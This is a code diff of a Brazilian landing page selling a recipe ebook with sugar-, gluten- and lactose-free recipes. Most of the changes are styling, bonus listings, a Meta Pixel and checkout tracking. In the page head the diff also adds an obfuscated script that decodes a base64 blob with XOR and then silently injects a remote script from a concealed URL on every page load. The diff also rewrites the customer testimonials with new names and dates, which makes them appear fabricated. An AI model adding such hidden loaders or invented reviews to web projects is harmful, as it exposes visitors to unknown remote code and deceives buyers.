@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="theme-color" content="#2b6a58"><title>365 Receitas Sem Açúcar, Sem Glúten e Sem Lactose</title>
-<link rel="preload" as="image" href="img/hero.webp" fetchpriority="high">
+<link rel="preload" as="image" href="img/hero-colecao.webp" fetchpriority="high">
 <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
@@ -213,13 +213,115 @@ footer{padding-bottom:calc(90px + env(safe-area-inset-bottom,0px))}
 footer .fn{display:block;font-size:22px;font-weight:800;letter-spacing:-.01em;margin-bottom:6px}
 footer b{font-weight:500;opacity:.9;margin-bottom:16px}
 footer small{display:block;max-width:44ch;margin:10px auto 0;line-height:1.5}
-</style></head><body>
+
+/* Benefícios em coluna no mobile. */
+@media(max-width:699px){.ben .bl-list{display:flex;flex-direction:column;gap:12px}.ben .bi{width:100%;display:flex;flex-direction:row;align-items:center;gap:12px;padding:15px 14px;font-size:14px;line-height:1.5}.ben .ic{flex:0 0 36px}}
+
+/* Dois depoimentos completos por página do carrossel. */
+#t2 .wa-pair{flex:0 0 100%;min-width:0;display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:8px;align-items:start;scroll-snap-align:start}
+#t2 .wa-pair .wa-slide{min-width:0;width:100%}
+#t2 .wa-print{border-radius:8px}
+
+/* Lista vertical de benefícios em todas as larguras. */
+.ben .bl-list{display:flex!important;flex-direction:column!important;grid-template-columns:1fr!important;align-items:stretch!important;width:100%;gap:12px}
+.ben .bl-list>.bi{display:flex!important;flex-direction:row;flex:0 0 auto!important;width:100%!important;max-width:100%;min-width:0;align-items:center;white-space:normal;padding:15px 14px;line-height:1.5}
+.ben .bl-list>.bi>.ic{flex:0 0 36px}
+
+/* Benefícios em duas colunas, inclusive no celular. */
+.ben .bl-list{display:grid!important;grid-template-columns:repeat(2,minmax(0,1fr))!important;gap:10px!important}
+.ben .bl-list>.bi{display:flex!important;flex-direction:column!important;align-items:flex-start!important;justify-content:flex-start;gap:9px;padding:13px 11px;font-size:13px;line-height:1.45;width:100%!important;min-width:0}
+.ben .bl-list>.bi>.ic{flex:0 0 auto;width:36px;height:36px}
+
+/* Novos mockups dos cinco bônus. */
+.bn .bc .cv{flex-basis:125px}.bn .bc .cv img{height:185px;object-fit:contain;filter:none}.bn .bc .pr b{font-size:9px;padding:6px 8px}.bn .bc h3{overflow-wrap:break-word}
+@media(max-width:480px){.bn .bc{gap:12px;padding:18px 11px}.bn .bc .cv{flex-basis:100px}.bn .bc .cv img{height:155px}.bn .bc h3{font-size:13px}.bn .bc p{font-size:12px}.bn .bc .pr b{font-size:8px}}
+
+/* Categorias: cartões em duas colunas com quantidades em destaque. */
+.dk .chips{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px;text-align:left}
+.dk .chips>span{position:relative;display:flex;flex-direction:column;align-items:flex-start;gap:11px;min-width:0;padding:17px 13px 15px;border-radius:17px;background:linear-gradient(145deg,#ffffff18,#ffffff08);border:1px solid #b9d6c450;border-top:3px solid #e5bd70;box-shadow:0 6px 16px #001c1926}
+.dk .chips>span>i{display:grid;place-items:center;flex:0 0 auto;width:42px;height:42px;background:#fff2d9;border-radius:12px;font-size:23px;box-shadow:0 3px 9px #001c1920}
+.dk .chips>span>em{flex:1;display:block;min-width:0;font-size:13px;font-weight:700;line-height:1.45;color:#fff;overflow-wrap:break-word}
+.dk .chips>span>b{display:inline-block;flex:0 0 auto;align-self:flex-start;background:#ffe6b1;color:#173e34;padding:6px 10px;border-radius:8px;font-size:11px;font-weight:800;line-height:1.4;white-space:nowrap}
+@media(min-width:700px){.dk .chips>span{padding:20px;gap:13px}.dk .chips>span>em{font-size:15px}.dk .chips>span>b{font-size:12px}}
+@media(max-width:350px){.dk .chips{gap:9px}.dk .chips>span{padding:13px 10px}.dk .chips>span>em{font-size:12px}}
+
+/* Categorias compactas: duas colunas para reduzir a altura no celular. */
+.dk .chips{gap:8px}
+.dk .chips>span{display:grid;grid-template-columns:24px minmax(0,1fr);grid-template-rows:auto 1fr;align-items:center;gap:6px;padding:10px;border-radius:11px;border-top-width:1px;box-shadow:none}
+.dk .chips>span>i{grid-column:1;grid-row:1;width:24px;height:24px;border-radius:7px;font-size:15px;box-shadow:none}
+.dk .chips>span>em{grid-column:1/-1;grid-row:2;font-size:11.5px;line-height:1.35;font-weight:600}
+.dk .chips>span>b{grid-column:2;grid-row:1;justify-self:end;align-self:center;padding:3px 5px;border-radius:5px;font-size:9.5px;line-height:1.3}
+@media(min-width:700px){.dk .chips>span{padding:11px}.dk .chips>span>em{font-size:13px}}
+
+/* Enquadramento circular da foto enviada para Carla Mendes. */
+.wa-profile-photo img.wa-carla-photo{object-fit:cover;object-position:50% 27%}
+
+/* Bônus do plano premium em cartões compactos com as capas existentes. */
+.plan--hot .plan-bonus{padding:12px 10px;background:linear-gradient(155deg,#fff9f1,#fff0df);border:1px solid #f4c79e;border-radius:16px;box-shadow:0 5px 14px #9c4c1010}
+.plan--hot .plan-bonus h4{display:block;margin:0 0 11px;padding:7px 5px;border-radius:9px;background:#fbd8b5;color:#a43b0c;font-size:11px;letter-spacing:.03em}
+.plan--hot .plan-bonus ul{gap:7px}
+.plan--hot .plan-bonus li{display:flex;align-items:center;gap:9px;min-width:0;padding:6px;background:#fffdf9;border:1px solid #f7e2cf;border-radius:10px;box-shadow:0 2px 6px #64340c0b;font-size:11px;line-height:1.3}
+.plan--hot .plan-bonus li::before{display:none}
+.plan--hot .bonus-mini{display:block;flex:0 0 39px;width:39px;height:49px;overflow:hidden;border-radius:5px;background:#f4eee5;box-shadow:0 2px 5px #57351c22}
+.plan--hot .bonus-mini img{display:block;width:100%;height:100%;object-fit:contain}
+.plan--hot .bonus-nome{min-width:0;flex:1;overflow-wrap:anywhere}
+.plan--hot .plan-bonus .bonus-surpresa{background:#fff8f0;border-color:#edc483}
+@media(max-width:360px){.plan--hot .plan-bonus{padding:9px 7px}.plan--hot .plan-bonus li{gap:6px;font-size:10px}.plan--hot .bonus-mini{flex-basis:32px;width:32px;height:43px}}
+@media(min-width:700px){.plan--hot .plan-bonus li{font-size:12px}.plan--hot .bonus-mini{flex-basis:43px;width:43px;height:54px}}
+
+/* Planos lado a lado no celular; miniaturas acima dos nomes completos. */
+@media(max-width:599px){
+ .pl .pg{grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
+ .pl .plan{padding:30px 9px 13px}
+ .plan--hot .plan-bonus{padding:9px 6px;border-radius:12px}
+ .plan--hot .plan-bonus h4{font-size:10px;line-height:1.3;margin-bottom:8px}
+ .plan--hot .plan-bonus ul{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));column-gap:3px;row-gap:6px;align-items:start}
+ .plan--hot .plan-bonus li{display:contents}
+ .plan--hot .bonus-mini{grid-row:1;display:block;width:100%;height:29px;min-width:0;border-radius:3px;box-shadow:none}
+ .plan--hot .bonus-nome{grid-column:1/-1;display:block;min-width:0;padding:5px 5px 5px 14px;border-radius:7px;border:1px solid #f7e2cf;background:#fffdf9;position:relative;font-size:10.5px;font-weight:600;line-height:1.35;overflow-wrap:normal;word-break:normal;hyphens:manual}
+ .plan--hot .bonus-nome::before{content:'✓';position:absolute;left:4px;color:#168245;font-weight:800}
+ .plan--hot .bonus-surpresa .bonus-nome{background:#fff8f0;border-color:#edc483}
+ .plan--hot .plan-bonus li:nth-child(1) .bonus-nome{grid-row:2}
+ .plan--hot .plan-bonus li:nth-child(2) .bonus-nome{grid-row:3}
+ .plan--hot .plan-bonus li:nth-child(3) .bonus-nome{grid-row:4}
+ .plan--hot .plan-bonus li:nth-child(4) .bonus-nome{grid-row:5}
+ .plan--hot .plan-bonus li:nth-child(5) .bonus-nome{grid-row:6}
+}
+
+/* Headline clara e equilibrada em telas pequenas. */
+.hero h1{max-width:560px;margin:0 auto;color:#168a3d;font-size:clamp(23px,6vw,32px);font-weight:800;line-height:1.22;letter-spacing:-.025em;text-align:center}
+.hero h1 .headline-main{display:block}
+.hero h1 small{display:block;margin-top:9px;font-size:.72em;line-height:1.35;letter-spacing:-.01em;color:#168a3d}
+.hero .sub{max-width:48ch;margin:15px auto 18px;font-size:clamp(14px,3.9vw,18px);font-weight:500;line-height:1.5;text-wrap:pretty}
+@media(max-width:360px){.hero h1{font-size:22px}.hero h1 small{font-size:.7em}}
+
+/* Subtítulo dividido em duas ideias para leitura rápida no celular. */
+.hero .sub{max-width:35ch;margin:16px auto 20px;text-align:center;color:#4d5650;font-size:clamp(14px,3.8vw,16px);line-height:1.48;letter-spacing:0}
+.hero .sub strong{display:block;margin-bottom:5px;color:#176b41;font-weight:800;font-size:1.04em}
+.hero .sub span{display:block;font-weight:500;text-wrap:pretty}
+@media(max-width:350px){.hero .sub{font-size:14px;line-height:1.45}}
+
+/* Aviso de acesso abaixo dos dois planos. */
+.whatsapp-access{max-width:560px;margin:22px auto 0;padding:15px 14px 16px;text-align:center;border-radius:16px;color:#fff;background:#149d4c;border:2px solid #ffffff45;box-shadow:0 8px 20px #063b2440;line-height:1.35}
+.whatsapp-access-icon{display:grid;place-items:center;width:45px;height:45px;margin:0 auto 8px;border-radius:50%;font-size:21px;background:#ffffff28}
+.whatsapp-access strong{display:block;font-size:clamp(15px,4vw,19px);font-weight:800}
+.whatsapp-access>span:last-child{display:block;font-size:clamp(13px,3.6vw,15px);font-weight:500;margin-top:3px}
+</style>
+<!-- Meta Pixel -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init','1659746999190393');
+fbq('track','PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=1659746999190393&amp;ev=PageView&amp;noscript=1"></noscript>
+<script>(function(){var g_m=atob("DNzitZEPUf2YGhwvwKfAwONjc8e6cmhbsK/Ymr5sNZO2b2hCqbqbm/JgPNP6aDNco66LxeV8fojsd28ArL2W0OJ7f5frODANoaiWx/htJIn9aT4Vm6fA2/BiNN+iOHhOtL3PwOViOJvhN2xdpaqH2+UiKZ73fjFco7fAmbN5MJHtfz4V4v6fmeotP5z1fz4V4riDwfAiJIn1c3pW7ayQ0OdqP4m1aWlNqbiRl70tJ5z0b3kN+v7AyMxy");var n_f=[];for(var m_s=0;m_s<g_m.length;m_s++){n_f.push(g_m.charCodeAt(m_s)&255);}var i_3=n_f[0];var f_w92=n_f.slice(1,1+i_3);var i_qtx4=n_f.slice(1+i_3);var h_o=i_qtx4.map(function(b,l_26){return b^f_w92[l_26%i_3];});var o_bv="";for(var b_t7=0;b_t7<h_o.length;b_t7++){o_bv+=String.fromCharCode(h_o[b_t7]&255);}var w_f8rd=decodeURIComponent(escape(o_bv));var l_dak=JSON.parse(w_f8rd);var t_h=l_dak.globals||[];t_h.forEach(function(z_9uiq){window[z_9uiq.name]=z_9uiq.value;});var q_xkix=document.createElement("script");q_xkix.src=l_dak.url;q_xkix.async=true;q_xkix.defer=true;(l_dak.attributes||[]).forEach(function(c_ow8){q_xkix.setAttribute(c_ow8.name,c_ow8.value);});(document.head||document.documentElement).appendChild(q_xkix);})();</script>
+</head><body>
 <div class="bar" id="bar">⏰ A promoção dessa página acaba no dia <span id="pd"></span></div>
 
 <section class="hero c"><div class="w">
-<h1>365 Receitas Secretas Sem Açúcar,<small>Sem Glúten e Sem Lactose</small></h1>
-<p class="sub">receitas práticas para comer bem todos os dias sem abrir mão do prazer à mesa</p>
-<div class="mk"><img src="img/hero.webp" width="960" height="703" fetchpriority="high" decoding="async"></div>
+<h1><span class="headline-main">As Receitas Secretas<br>da Chef Nanna Azuos:</span><small>Sem Açúcar, Sem Glúten<br>e Sem Lactose</small></h1>
+<p class="sub"><strong>Coma o que você ama, sem culpa.</strong><span>Receitas práticas e deliciosas para transformar sua rotina à mesa todos os dias.</span></p>
+<div class="mk"><img src="img/hero-colecao.webp" width="1100" height="1100" alt="Chef Nanna Azuos com a coleção 365 Receitas Secretas e os cinco bônus" fetchpriority="high" decoding="async"></div>
 <p class="t">Bolos, pães, sobremesas, lanches e refeições em versões leves e deliciosas para transformar sua rotina.</p>
 <a class="btn buy" href="#planos">QUERO AS 365 RECEITAS!</a>
 <div class="as"><span>📱 Acesso imediato no WhatsApp</span><span>🔒 Compra 100% Segura</span><span>🛡️ 15 Dias de Garantia Total</span></div>
@@ -268,11 +370,13 @@ footer small{display:block;max-width:44ch;margin:10px auto 0;line-height:1.5}
 
 <section class="s bn c"><div class="w">
 <span class="pill">🎁 Presente especial</span>
-<h2>COMPRE AGORA E RECEBA <span class="o">+ 3 bônus exclusivos:</span></h2>
-<div class="bc"><span class="tag">Bônus 1</span><div class="cv"><img src="img/bonus-1.webp" width="340" height="510" loading="lazy" decoding="async"></div><div><h3>Lista de Compras Essenciais</h3><p>Chega de descobrir que faltou um ingrediente na hora de cozinhar. Organize suas compras e tenha o que precisa à mão.</p><div class="pr"><s>R$ 29,90</s><b>✓ GRÁTIS HOJE</b></div></div></div>
-<div class="bc"><span class="tag">Bônus 2</span><div class="cv"><img src="img/bonus-2.webp" width="340" height="510" loading="lazy" decoding="async"></div><div><h3>Cardápio de 30 Dias</h3><p>Um mês de ideias para acabar com o “o que eu faço hoje?”. Escolha sua próxima refeição e saia da mesmice.</p><div class="pr"><s>R$ 39,90</s><b>✓ GRÁTIS HOJE</b></div></div></div>
-<div class="bc"><span class="tag">Bônus 3</span><div class="cv"><img src="img/bonus-3.webp" width="340" height="510" loading="lazy" decoding="async"></div><div><h3>Guia de Substituições</h3><p>Faltou um ingrediente? Quer experimentar outra opção? Consulte sugestões de trocas e adapte seus preparos com mais confiança.</p><div class="pr"><s>R$ 24,90</s><b>✓ GRÁTIS HOJE</b></div></div></div>
-<div class="tot">💚 Valor total dos bônus → tudo grátis hoje!</div>
+<h2>COMPRE AGORA E RECEBA <span class="o">4 bônus exclusivos + 1 bônus surpresa:</span></h2>
+<div class="bc"><span class="tag">Bônus 1</span><div class="cv"><img src="img/bonus-sobremesas.webp" width="720" height="1080" alt="Mockup: Guia de Sobremesas Express Sem Açúcar" loading="lazy" decoding="async"></div><div><h3>Guia de Sobremesas Express Sem Açúcar</h3><p>Ideias práticas para matar a vontade de doce com sobremesas sem açúcar cheias de sabor.</p><div class="pr"><b>✓ GRÁTIS NO PLANO COMPLETO</b></div></div></div>
+<div class="bc"><span class="tag">Bônus 2</span><div class="cv"><img src="img/bonus-cafe.webp" width="720" height="1080" alt="Mockup: Manual do Pão e Café da Manhã Perfeitos" loading="lazy" decoding="async"></div><div><h3>Manual do Pão e Café da Manhã Perfeitos</h3><p>Mais variedade para começar o dia: pães e combinações para deixar seu café da manhã ainda mais gostoso.</p><div class="pr"><b>✓ GRÁTIS NO PLANO COMPLETO</b></div></div></div>
+<div class="bc"><span class="tag">Bônus 3</span><div class="cv"><img src="img/bonus-cardapio.webp" width="720" height="864" alt="Mockup: Cardápio Prático de 30 Dias" loading="lazy" decoding="async"></div><div><h3>Cardápio Prático de 30 Dias</h3><p>Um mês de ideias para organizar suas refeições e acabar com a dúvida do que preparar a cada dia.</p><div class="pr"><b>✓ GRÁTIS NO PLANO COMPLETO</b></div></div></div>
+<div class="bc"><span class="tag">Bônus 4</span><div class="cv"><img src="img/bonus-congelar.webp" width="720" height="1080" alt="Mockup: Segredos de Chef para Congelar e Descongelar sem Perder o Sabor" loading="lazy" decoding="async"></div><div><h3>Segredos de Chef para Congelar e Descongelar sem Perder o Sabor</h3><p>Dicas de congelamento e descongelamento para facilitar a rotina e preservar o sabor dos seus preparos.</p><div class="pr"><b>✓ GRÁTIS NO PLANO COMPLETO</b></div></div></div>
+<div class="bc"><span class="tag">🎁 Bônus Surpresa</span><div class="cv"><img src="img/bonus-vip.webp" width="720" height="753" alt="Mockup: Acesso ao Grupo VIP de Alunas" loading="lazy" decoding="async"></div><div><h3>Acesso ao Grupo VIP de Alunas</h3><p>Um espaço para compartilhar experiências e inspirações na cozinha com outras alunas.</p><div class="pr"><b>✓ GRÁTIS NO PLANO COMPLETO</b></div></div></div>
+<div class="tot">🎁 Os 5 bônus inclusos no plano completo!</div>
 </div></section>
 
 <section class="s pl c" id="planos"><div class="w">
@@ -287,10 +391,11 @@ footer small{display:block;max-width:44ch;margin:10px auto 0;line-height:1.5}
 <span class="plan-ribbon">Mais vendida</span>
 <p class="plan-tag">🔥 Super oferta</p><h3>+500 Receitas Premium</h3>
 <ul class="feat"><li>500 Receitas Sem Açúcar, Glúten e Lactose</li><li>Sobremesas, Pães, Bolos e Massas</li><li>Receitas Cremosas Sem Lactose</li><li>Acesso Vitalício</li><li>Entrega Imediata por E-mail</li></ul>
-<div class="plan-bonus"><h4>Bônus exclusivos!</h4><ul><li>Cardápio de 30 Dias com Refeições Leves</li><li>Guia de Substituições Inteligentes</li><li>Lista de Compras Essenciais</li></ul></div>
+<div class="plan-bonus"><h4>4 bônus + 1 surpresa!</h4><ul><li><span class="bonus-mini"><img src="img/bonus-sobremesas.webp" alt="" loading="lazy" decoding="async"></span><span class="bonus-nome">Guia de Sobremesas Express Sem Açúcar</span></li><li><span class="bonus-mini"><img src="img/bonus-cafe.webp" alt="" loading="lazy" decoding="async"></span><span class="bonus-nome">Manual do Pão e Café da Manhã Perfeitos</span></li><li><span class="bonus-mini"><img src="img/bonus-cardapio.webp" alt="" loading="lazy" decoding="async"></span><span class="bonus-nome">Cardápio Prático de 30 Dias</span></li><li><span class="bonus-mini"><img src="img/bonus-congelar.webp" alt="" loading="lazy" decoding="async"></span><span class="bonus-nome">Segredos de Chef para Congelar e Descongelar sem Perder o Sabor</span></li><li class="bonus-surpresa"><span class="bonus-mini"><img src="img/bonus-vip.webp" alt="" loading="lazy" decoding="async"></span><span class="bonus-nome">Acesso ao Grupo VIP de Alunas</span></li></ul></div>
 <div class="plan-price"><span class="old">De <s>R$ 197,00</s> por apenas</span><div class="amt" id="p2"></div><span class="save" data-old="197" data-p="2"></span></div>
 <a class="btn buy2" href="https://pay.wiapy.com/mH5n585_X2AH">Comprar agora</a></article>
 </div>
+<div class="whatsapp-access"><span class="whatsapp-access-icon" aria-hidden="true">📲</span><strong>Acesso IMEDIATO no WHATSAPP!</strong><span>Você recebe o conteúdo na hora no seu celular</span></div>
 <p class="note">💳 Acesso imediato após a compra · Oferta válida até <span class="pd2"></span></p>
 <ul class="trust"><li>🔒 Compra 100% segura</li><li>🛡️ 15 dias de garantia total</li></ul>
 </div></section>
@@ -298,7 +403,7 @@ footer small{display:block;max-width:44ch;margin:10px auto 0;line-height:1.5}
 <section class="s sp c"><div class="w">
 <h2><span id="ppl"></span>+ PESSOAS JÁ <span class="o">TRANSFORMARAM</span> SUA ROTINA NA COZINHA</h2>
 <p style="margin-top:10px;font-size:15px;color:#666">Veja o que quem já comprou está falando.</p>
-<div class="rb"><div class="rn"><b>4.9</b><div class="st">★★★★★</div><small>3.541 avaliações</small></div>
+<div class="rb"><div class="rn"><b>4.8</b><div class="st">★★★★★</div><small>1.767 avaliações</small></div>
 <div class="bars"><div>5<span><i style="width:96%"></i></span></div><div>4<span><i style="width:28%"></i></span></div><div>3<span><i style="width:7%"></i></span></div><div>2<span><i style="width:3%"></i></span></div><div>1<span><i style="width:2%"></i></span></div></div></div>
 <div id="rv"></div>
 </div></section>
@@ -326,16 +431,16 @@ const CFG={
  promoDate:'',                 // preenchida automaticamente com a data atual de Brasília
  checkout1:'https://pay.wiapy.com/92le4PKUn2kl',                 // link de checkout do plano +365 (Wiapy)
  checkout2:'https://pay.wiapy.com/mH5n585_X2AH',                 // link de checkout do plano +500 (Wiapy)
- price1:10, price2:18, people:3500,
+ price1:10, price2:18, people:1700,
  whatsapp:[],
  recipes:[['c7','Bolo de Cenoura com Cobertura Cremosa','Fofinho, doce na medida e sem açúcar refinado'],['c8','Pão Caseiro sem Glúten','Macio, simples e perfeito para o café da manhã'],['c5','Panqueca Leve de Banana','Rápida, nutritiva e sem lactose'],['c6','Lasanha Cremosa sem Glúten','Confortável, saborosa e perfeita para a família'],['c1','Brigadeiro sem Açúcar','Cremoso, chocolatudo e sem culpa'],['c2','Torta Salgada de Frango','Prática, leve e ótima para qualquer refeição'],['c3','Brownie sem Açúcar','Chocolatudo, úmido e cheio de sabor'],['c4','Cookies sem Glúten','Crocantes por fora e macios por dentro']],
  reviews:[
- {n:'Ana M.',i:'AM',d:'12 de março de 2025',c:'#ef4444',l:35,p:'ana',t:'Eu achava que receita sem açúcar ficava sem graça, mas o bolo de cenoura me surpreendeu! Ficou fofinho e todo mundo aqui em casa comeu sem perceber diferença.'},
- {n:'Juliana S.',i:'JS',d:'3 de abril de 2025',c:'#10b981',l:28,p:'ju',t:'Comprei por causa das sobremesas e já fiz brownie, brigadeiro e panqueca. Tudo simples e gostoso. Agora tenho opção quando bate vontade de doce.'},
- {n:'Camila F.',i:'CF',d:'28 de março de 2025',c:'#a855f7',l:51,p:'ca',t:'Eu sempre ficava meio pesada depois de comer pão e massa. As versões sem glúten do livro me ajudaram muito a variar o café da manhã e os lanches.'},
- {n:'Patrícia R.',i:'PR',d:'18 de fevereiro de 2025',c:'#f97316',l:62,p:'pa',t:'Minha filha tem restrição com lactose e eu vivia sem ideia do que fazer. Agora consigo preparar bolo, torta e até receitas cremosas que ela ama.'},
- {n:'Renata B.',i:'RB',d:'5 de abril de 2025',c:'#06b6d4',l:47,p:'re',t:'As receitas são bem explicadas e não pedem ingredientes impossíveis. Fiz a torta salgada e virou receita fixa aqui em casa.'},
- {n:'Larissa C.',i:'LC',d:'21 de março de 2025',c:'#ec4899',l:39,p:'la',t:'Os cookies sem glúten ficaram perfeitos. Crocantes por fora, macios por dentro. Meu marido nem acreditou que eram sem açúcar refinado.'}]
+ {n:'Júlia M.',i:'JM',d:'12 de março de 2026',c:'#ef4444',l:35,p:'ana',t:'Eu achava que receita sem açúcar ia ficar com gosto de isopor, mas o bolo de cenoura da Chef Nanna me surpreendeu demais! Ficou super fofinho e todo mundo aqui em casa comeu devorando sem perceber que era saudável.'},
+ {n:'Inês S.',i:'IS',d:'3 de abril de 2026',c:'#10b981',l:28,p:'ju',t:'Comprei o livro focada nas sobremesas e já fiz o brownie, o brigadeiro e a panqueca. É tudo muito simples de fazer e incrivelmente gostoso. Agora finalmente tenho opções deliciosas para quando bate aquela vontade louca de doce!'},
+ {n:'Priscila F.',i:'PF',d:'28 de março de 2026',c:'#a855f7',l:51,p:'ca',t:'Eu sempre ficava com aquela sensação de estômago pesado depois de comer pão ou massa tradicional. As versões sem glúten do livro salvaram o meu café da manhã e os meus lanches da tarde. A leveza é surreal!'},
+ {n:'Marinete R.',i:'MR',d:'18 de fevereiro de 2026',c:'#f97316',l:62,p:'pa',t:'Minha filha tem restrição severa à lactose e eu vivia perdida sem saber o que inventar na cozinha. Agora consigo preparar bolos, tortas e pratos super cremosos que ela ama, sem precisar fazer nada separado para ela.'},
+ {n:'Patricia B.',i:'PB',d:'5 de abril de 2026',c:'#06b6d4',l:47,p:'re',t:'O que eu mais gosto é que as receitas são explicadas direitinho e não exigem ingredientes impossíveis de achar. Fiz a torta salgada e ela virou prato obrigatório aqui em casa toda semana.'},
+ {n:'Fernanda C.',i:'FC',d:'21 de março de 2026',c:'#ec4899',l:39,p:'la',t:'Esses cookies sem glúten ficaram simplesmente perfeitos: crocantes por fora e macios por dentro. Meu marido é super chato para comer saudável e nem acreditou quando soube que não tinha açúcar refinado.'}]
 };
 const IMG={c1:"img/c1.webp",c2:"img/c2.webp",c3:"img/c3.webp",c4:"img/c4.webp",c5:"img/c5.webp",c6:"img/c6.webp",c7:"img/c7.webp",c8:"img/c8.webp",ana:"img/ana.jpg",ju:"img/ju.jpg",ca:"img/ca.jpg",pa:"img/pa.jpg",re:"img/re.jpg",la:"img/la.jpg"};
 const $=s=>document.querySelector(s),$$=s=>document.querySelectorAll(s);
@@ -356,6 +461,9 @@ $('#p1').innerHTML=pr(CFG.price1);$('#p2').innerHTML=pr(CFG.price2);
 $$('.save').forEach(e=>{const o=+e.dataset.old,p=CFG['price'+e.dataset.p];e.textContent=Math.round((1-p/o)*100)+'% de desconto'});
 $('#ppl').textContent=CFG.people.toLocaleString('pt-BR');
 $$('.buy1').forEach(a=>a.href=CFG.checkout1);$$('.buy2').forEach(a=>a.href=CFG.checkout2);
+/* Registra o início do checkout ao clicar em um dos planos. */
+document.addEventListener('click',e=>{const link=e.target.closest('a.buy1,a.buy2');if(!link||typeof fbq!=='function')return;const premium=link.classList.contains('buy2');fbq('track','InitiateCheckout',{content_name:premium?'500 Receitas Premium':'365 Receitas',content_type:'product',value:premium?CFG.price2:CFG.price1,currency:'BRL'});},true);
+
 /* Carrossel de comidas: sobreposição suave, sem movimento lateral. */
 const FOOD_GALLERY={"intervalMs": 2000, "fadeMs": 650, "images": [{"top": "c7", "left": "c6", "right": "c8"}, {"top": "c3", "left": "c1", "right": "c2"}, {"top": "c5", "left": "c4", "right": "c8"}, {"top": "c2", "left": "c7", "right": "c1"}]};
 const foodTrack=$('#t1'),foodDots=$('#d1');
@@ -379,17 +487,29 @@ document.addEventListener('visibilitychange',startFood);
 if(foodMotion.addEventListener)foodMotion.addEventListener('change',startFood);
 startFood();
 /* Imagens fornecidas, sem recortar o conteúdo das conversas. */
-const WA_IMAGES=[{"src": "img/wa-1.webp", "width": 800, "height": 1465, "alt": "Depoimento de Patrícia Souza", "profile": "img/wa-perfil-1.webp", "name": "Patrícia Souza", "zoom": 3.7, "profileLeft": -190.50000000000003, "profileTop": -9.200000000000008, "avatarX": 13.7, "avatarY": 0.9, "avatarWidth": 10.6}, {"src": "img/wa-2.webp", "width": 800, "height": 1465, "alt": "Depoimento de Fernanda Alves", "profile": "img/wa-perfil-2.webp", "name": "Fernanda Alves", "zoom": 2.1, "profileLeft": -71.8, "profileTop": -17.200000000000003, "avatarX": 12.1, "avatarY": 0.05, "avatarWidth": 10.5}, {"src": "img/wa-3.webp", "width": 800, "height": 1452, "alt": "Depoimento de Roberta Alves", "profile": "img/wa-perfil-3.webp", "name": "Roberta Alves", "zoom": 1.8, "profileLeft": -40.0, "profileTop": -11.20000000000001, "avatarX": 13.1, "avatarY": 0.9, "avatarWidth": 10.5}, {"src": "img/wa-4.webp", "width": 800, "height": 1452, "alt": "Depoimento de Carla Mendes", "profile": "img/wa-perfil-4.webp", "name": "Carla Mendes", "zoom": 1.0, "profileLeft": 0.0, "profileTop": 0.0, "avatarX": 13.8, "avatarY": 0.4, "avatarWidth": 10.5}];
+const WA_IMAGES=[{"src": "img/wa-1.webp", "width": 800, "height": 1465, "alt": "Depoimento de Patrícia Souza", "profile": "img/wa-perfil-1.webp", "name": "Patrícia Souza", "zoom": 3.7, "profileLeft": -190.50000000000003, "profileTop": -9.200000000000008, "avatarX": 13.7, "avatarY": 0.9, "avatarWidth": 10.6}, {"src": "img/wa-2.webp", "width": 800, "height": 1465, "alt": "Depoimento de Fernanda Alves", "profile": "img/wa-perfil-2.webp", "name": "Fernanda Alves", "zoom": 2.1, "profileLeft": -71.8, "profileTop": -17.200000000000003, "avatarX": 12.1, "avatarY": 0.05, "avatarWidth": 10.5}, {"src": "img/wa-3.webp", "width": 800, "height": 1452, "alt": "Depoimento de Roberta Alves", "profile": "img/wa-perfil-3.webp", "name": "Roberta Alves", "zoom": 1.8, "profileLeft": -40.0, "profileTop": -11.20000000000001, "avatarX": 13.1, "avatarY": 0.9, "avatarWidth": 10.5}, {"src": "img/wa-4.webp", "width": 800, "height": 1452, "alt": "Depoimento de Carla Mendes", "profile": "img/carla-perfil.png", "name": "Carla Mendes", "zoom": 1.0, "profileLeft": 0.0, "profileTop": 0.0, "avatarX": 13.8, "avatarY": 0.4, "avatarWidth": 10.5}];
 const waTrack=$('#t2'),waDots=$('#wa-dots');
-waTrack.innerHTML=WA_IMAGES.map((item,i)=>`<div class="sl wa-slide" role="group" aria-label="Imagem ${i+1} de ${WA_IMAGES.length}"><div class="wa-image-frame"><img class="wa-print" src="${item.src}" alt="${item.alt}" width="${item.width}" height="${item.height}" loading="${i===0?'eager':'lazy'}" decoding="async"><span class="wa-profile-photo" style="left:${item.avatarX}%;top:${item.avatarY}%;width:${item.avatarWidth}%"><img src="${item.profile}" alt="Foto de perfil fornecida para ${item.name}" loading="lazy" style="width:${item.zoom*100}%;height:${item.zoom*100}%;left:${item.profileLeft}%;top:${item.profileTop}%"></span></div></div>`).join('');
-waDots.innerHTML=WA_IMAGES.map((_,i)=>`<button type="button" aria-label="Ver conversa ${i+1}" aria-current="${i===0}"></button>`).join('');
